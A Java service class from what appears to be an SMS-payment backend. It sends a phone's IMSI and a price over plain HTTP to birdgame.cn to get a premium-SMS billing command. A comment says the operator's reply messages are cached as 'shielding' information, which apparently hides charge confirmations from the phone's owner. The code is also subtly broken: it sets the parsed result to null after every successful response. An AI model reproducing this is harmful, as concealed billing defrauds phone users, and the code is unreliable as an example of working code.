package com.hytx.service.client;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import net.sf.json.JSONObject;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.hytx.cache.ThreadLocalCache;
import com.hytx.constance.BaseContance;
import com.hytx.dao.sync.ori.SyncProvinceZjhyMapper;
import com.hytx.dto.client.BaseReqDto;
import com.hytx.dto.sync.TykjResDto;
import com.hytx.model.baseConf.Operate;
import com.hytx.model.baseConf.OperateKeyword;
import com.hytx.model.client.ReqSms;
import com.hytx.model.client.ReqSmsCommand;
import com.hytx.service.baseConf.IProvinceService;
import com.hytx.util.StringUtil;

@Service("dynamicOperateTykj")
public class DynamicOperateTykj implements IDynamicOperate {
	private Logger logger = LoggerFactory.getLogger("CLIENT_LOG");

	@Autowired
	private IReqSmsService reqSmsService;
	@Autowired
	private IProvinceService provinceService;
	@Autowired
	private SyncProvinceZjhyMapper provincezjhy;
	private TykjResDto requsetTykjSms;

	/**
	 * cp=1035 appid=103500001 获取电信天翼空间 1035动态指令
	 * 
	 * */
	@Override
	public ReqSmsCommand getReqSmsCommand(ReqSms smsReq, BaseReqDto baseReqDto,
			Operate dynaOperate) {
		Integer feeValue = dynaOperate.getPrice() == null
				|| dynaOperate.getPrice() < 1 ? smsReq.getFeeValue()
				: dynaOperate.getPrice();
		int serialNum = reqSmsService.getNextSerialNum();
		StringBuilder sb = new StringBuilder();
		// cp=1031&r=12&appid=103100001&amp;imsi=460036670351048&p=500
		sb.append("cp=1035&appid=103500001&imsi=").append(smsReq.getImsi())
				.append("&p=").append(feeValue).append("&r")
				.append(StringUtil.format(serialNum + "", 7));
		requsetTykjSms = getRequsetTykjSms(sb.toString());

		if (requsetTykjSms == null
				|| StringUtils.isBlank(requsetTykjSms.getMoContent())) {
			return null;
		}
		ReqSmsCommand command = new ReqSmsCommand();
		command.setAppId(baseReqDto.getApp().getId());
		command.setFeeValue(feeValue);
		command.setOperateId(dynaOperate.getId());
		command.setOrderId(smsReq.getOrderId());
		command.setPayPointId(smsReq.getPayPointId());
		command.setMoContent(requsetTykjSms.getMoContent());
		command.setUpdateDt(new Date());
		command.setSendStatus(BaseContance.INIT_STATUS);
		if (StringUtils.isBlank(dynaOperate.getFeeCode())) {
			command.setMoNum(requsetTykjSms.getMoNum());
		} else {
			command.setMoNum(dynaOperate.getFeeCode());
		}
		OperateKeyword opKey = new OperateKeyword();
		opKey.setOperateId(dynaOperate.getId());
		opKey.setMtNum(requsetTykjSms.getMtNum());
		opKey.setMtContent(requsetTykjSms.getMtContent());
		// 将动态指令的屏蔽信息添加的缓存里
		Map<Integer, List<OperateKeyword>> map = ThreadLocalCache.dynaOpKeyword
				.get();
		if (map == null) {
			map = new HashMap<Integer, List<OperateKeyword>>();
			ThreadLocalCache.dynaOpKeyword.set(map);
		}
		List<OperateKeyword> list = new ArrayList<OperateKeyword>();
		list.add(opKey);
		map.put(dynaOperate.getId(), list);
		return command;
	}

	public TykjResDto getRequsetTykjSms(String req) {
		TykjResDto trd = new TykjResDto();
		String content = "";
		try {
			String url = "http://www.birdgame.cn/market/snpay/getContent?"
					+ req;

			HttpClient client = new HttpClient();
			client.getParams().setContentCharset("UTF-8");
			GetMethod method = new GetMethod(url);
			client.executeMethod(method);
			System.out.println(method.getStatusCode());
			content = method.getResponseBodyAsString();
			System.out.println("content:" + content);
			if (!StringUtils.isBlank(content)) {
				JSONObject jsonObject = JSONObject.fromObject(content);
				if (jsonObject.getString("resultCode").equals("000000")) {
					trd.setResultCode("000000");
					trd.setResultDesc(jsonObject.getString("resultDesc"));
					jsonObject = JSONObject.fromObject(jsonObject
							.getString("result"));
					trd.setMoContent(jsonObject.getString("moContent"));
					trd.setMoNum(jsonObject.getString("moNum"));
					trd.setMtContent(jsonObject.getString("mtContent"));
					trd.setMtNum(jsonObject.getString("mtNum"));
					trd.setOperator(jsonObject.getString("operator"));
					trd.setOperName(jsonObject.getString("operName"));
				}
				;

				trd = null;
			}

		} catch (Exception e) {
			e.printStackTrace();

			return null;
		}

		return trd;

	}
}
